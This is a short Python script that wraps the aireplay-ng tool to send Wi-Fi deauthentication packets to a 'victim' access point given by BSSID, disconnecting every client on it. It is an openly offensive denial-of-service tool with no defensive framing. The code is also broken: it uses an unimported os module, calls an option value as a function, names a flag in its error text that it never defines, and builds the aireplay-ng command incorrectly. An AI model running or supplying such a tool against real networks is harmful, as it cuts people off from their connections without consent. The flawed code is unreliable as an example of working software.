import subprocess
import optparse
import re

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-b", "--bssid", dest="target", help="The BSSID of your victim.")
    parser.add_option("-i", "--interface", dest="interface", help="The name of the interface you're going to use for the attack")
    parser.add_option("-p", "--packets", dest="packets", help="The number of deauthentication packet's to send to the victim. (0 = unlimited)")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("Please specify a target using the -t or --target parameter.\nUse --help for more informations")
    elif not options.interface:
        parser.error("Please specify an interface using the -i or --interface parameter.\nUse --help for more informations.")
    elif not options.packets():
        parser.error("Please specify the number of packet's you wan't to send.\nUse --help for more informations.")
    return options

def power(target, interface, packets):
    i = 1
    while i < 4:
        print(i)
        os.system("sleep 1")
        i+=1
        
    print("POOOOOOOOOOWWWWWWWWEEEEEEEEEERRRRRRRRRRRRR !!!!!!!!!")
    os.system("sleep 3")
    os.system("clear")
    print("DeAuthenticating all clients on " + target)
    subprocess.call(["aireplay-ng --deauth",packets,"-a",target,interface,"--ignore-negative-one"])


options = get_arguments()
power(options.target,options.interface,options.packets)
